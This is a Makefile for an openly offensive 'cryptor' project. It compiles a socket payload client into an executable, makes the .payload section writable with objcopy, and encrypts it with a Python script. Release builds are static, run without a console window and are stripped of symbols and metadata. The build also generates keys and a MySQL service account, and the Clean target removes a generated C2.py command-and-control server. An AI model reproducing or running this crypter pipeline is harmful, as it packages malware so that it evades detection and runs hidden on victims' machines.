#@echo off
# Make file that builds the working cryptor
#
# Copyright (C) 2020  @Qu3b411
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
#


Dpath = ./bin/Debug
Rpath = ./bin/Release
SrcPath = ./CL_SRC
SvrPath = ./SVR_SRC
Payload?= test-sockets
INC=-I./CL_SRC
Debug: $(SrcPath)/main.c $(SrcPath)/win32Linker.ld $(SrcPath)/linuxLinker.ld |  $(Dpath)

ifeq ($(OS),Windows_NT)
	@echo [*] Dynamically Generating header files
	@echo [*] Installing Python requirements
	@py -3 ./MFScripts/install.py
	@echo [*] Checking Config File for server requirements. This may require configration!
	@py -3 ./MFScripts/config.py
	@echo [*] Configuring MySQL Service Account!
	@py -3 ./MFScripts/MySQLDatabaseConfig.py
	@echo [*] Config file found at expected location!
	@echo [*] Generating keys...
	@py -3 ./MFScripts/KeyGen.py
	@echo [*] Keys Generated!
	@echo [*] Header files Generated.
	@echo [*] LINKING FILE...
	@# We are going to use a sub directory and make both objects
	@gcc -c  $(SrcPath)/main.c  -o $(Dpath)/cryptor.o 
	@gcc -c  ./payload/$(Payload)/client/*.c  -o $(Dpath)/payload.o $(INC)

	@gcc -g -T $(SrcPath)/win32Linker.ld   $(Dpath)/cryptor.o $(Dpath)/payload.o -o $(Dpath)/cryptor.exe -lCrypt32 -lWs2_32 -lBCrypt
	@echo COMPLETED: file has been linked into an executable format!

	@echo [*] REMOVING READONLY PROTECTION FROM .payload...
	@objcopy --set-section-flags .payload=code,data,alloc,contents,load $(Dpath)/cryptor.exe $(Dpath)/cryptor.exe
	@echo [*] COMPLETED: .payload section is now writable
	
	@echo [*] Encrypting .payload section...
	@py -3 ./MFScripts/cryptPayload.py $(Dpath)


else
	@echo [*] Dynamically Generating header files
	@echo [*] Installing Python requirements
	@python3 ./MFScripts/install.py
	@echo [*] Checking Config File for server requirements. This may require configration!
	@python3 ./MFScripts/config.py
	@echo [*] Configuring MySQL Service Account!
	@py -3 ./MFScripts/MySQLDatabaseConfig.py
	@echo [*] Config file found at expected location!
	@echo [*] Generating keys...
	@python3 ./MFScripts/KeyGen.py
	@echo [*] Keys Generated!
	@echo [*] Header files Generated.
	@echo [*] LINKING FILE...
	@# We are going to use a sub directory and make both objects
	@gcc -c  $(SrcPath)/main.c  -o $(Dpath)/cryptor.o 
	@gcc -c  ./payload/$(Payload)/client/*.c  -o $(Dpath)/payload.o $(INC)
	@gcc -g -T $(SrcPath)/linuxLinker.ld  $(Dpath)/cryptor.o $(Dpath)/payload.o -o $(Dpath)/cryptor.exe

	@echo [*] COMPLETED: file has been linked into a mn executable format!
	@echo [*] REMOVING READONLY PROTECTION FROM .payload...
	@objcopy --set-section-flags .payload=code,data,alloc,contents,load $(Dpath)/cryptor.exe $(Dpath)/cryptor.exe
	@echo [*] COMPLETED: .payload section is now writable

	@echo [*] Encrypting .payload section...
	@python3 ./MFScripts/cryptPayload.py $(Dpath)
endif

Release: $(SrcPath)/main.c $(SrcPath)/win32linker.ld $(SrcPath)/linuxLinker.ld | $(Rpath)

ifeq ($(OS),Windows_NT)
	@echo [*] Dynamically Generating header files

	@echo [*] Installing Python requirements
	@py -3 ./MFScripts/install.py
	@echo [*] Checking Config File for server requirements. This may require configration!
	@py -3 ./MFScripts/config.py
	@echo [*] Configuring MySQL Service Account!
	@py -3 ./MFScripts/MySQLDatabaseConfig.py
	@echo [*] Config file found at expected location!
	@echo [*] Generating keys...
	@py -3 ./MFScripts/KeyGen.py
	@echo [*] Keys Generated!
	@echo [*] Header files Generated.

	@echo [*] LINKING FILE...
	
	@gcc -c  $(SrcPath)/main.c  -o $(Rpath)/cryptor.o
	@gcc -c  ./payload/$(Payload)/client/*.c  -o $(Rpath)/payload.o $(INC)
	
	@gcc -s -static -mwindows -fvisibility=hidden -T $(SrcPath)/win32Linker.ld  $(Rpath)/cryptor.o $(Rpath)/payload.o -o $(Rpath)/cryptor.exe -lCrypt32 -lWs2_32 -lBCrypt 
	@echo [*] COMPLETED: file has been linked into a mn executable format!
	@strip -R .comment -R .note $(Rpath)/cryptor.exe
	@strip -s $(Rpath)/cryptor.exe

	@echo [*] REMOVING READONLY PROTECTION FROM .payload...
	@objcopy --set-section-flags .payload=code,data,alloc,contents,load $(Rpath)/cryptor.exe $(Rpath)/cryptor.exe
	@echo [*] COMPLETED: .payload section is now writable

	@echo [*] Encrypting .payload section...
	@py -3 ./MFScripts/cryptPayload.py $(Rpath)
else
	@echo [*] Dynamically Generating header files

	@echo [*] Installing Python requirements
	@python3  ./MFScripts/install.py
	@echo [*] Checking Config File for server requirements. This may require configration!
	@python3 ./MFScripts/config.py
	@echo [*] Configuring MySQL Service Account!
	@py -3 ./MFScripts/MySQLDatabaseConfig.py
	@echo [*] Config file found at expected location!
	@echo [*] Generating keys...
	@python3 ./MFScripts/KeyGen.py
	@echo [*] Keys Generated!
	@echo [*] Header files Generated.

	@echo [*] LINKING FILE...
	
	@gcc -c  $(SrcPath)/main.c  -o $(Rpath)/cryptor.o
	@gcc -c  ./payload/$(Payload)/client/*.c  -o $(Rpath)/payload.o $(INC)
	
	@gcc -s -static -mwindows -fvisibility=hidden -T $(SrcPath)/linuxLinker.ld   $(Rpath)/cryptor.o $(Rpath)/payload.o -o $(Rpath)/cryptor.exe
	@echo [*] COMPLETED: file has been linked into a mn executable format!
	@strip -R .comment -R .note $(Rpath)/cryptor.exe
	@strip -s $(Rpath)/cryptor.exe

	@echo [*] REMOVING READONLY PROTECTION FROM .payload...
	@objcopy --set-section-flags .payload=code,data,alloc,contents,load $(Rpath)/cryptor.exe $(Rpath)/cryptor.exe
	@echo [*] COMPLETED: .payload section is now writable

	@echo [*] Encrypting .payload section...
	@python3 ./MFScripts/cryptPayload.py $(Rpath)
endif

Clean:
	@echo Cleanning all generated files and directories
	rm -rf ./bin
	rm -f $(SrcPath)/Cryptor.h
	rm -f $(SvrPath)/C2.py
	rm -rf $(SvrPath)/__pycache__
	rm -f ./conf
	@echo Directorys and files are clean.

.PHONY: Conf
Conf:
	@echo Removing current Conf file
	rm -f ./conf
	python3 ./MFScripts/config.py

$(Dpath):
	mkdir -p $(Dpath)

$(Rpath):
	mkdir -p $(Rpath)
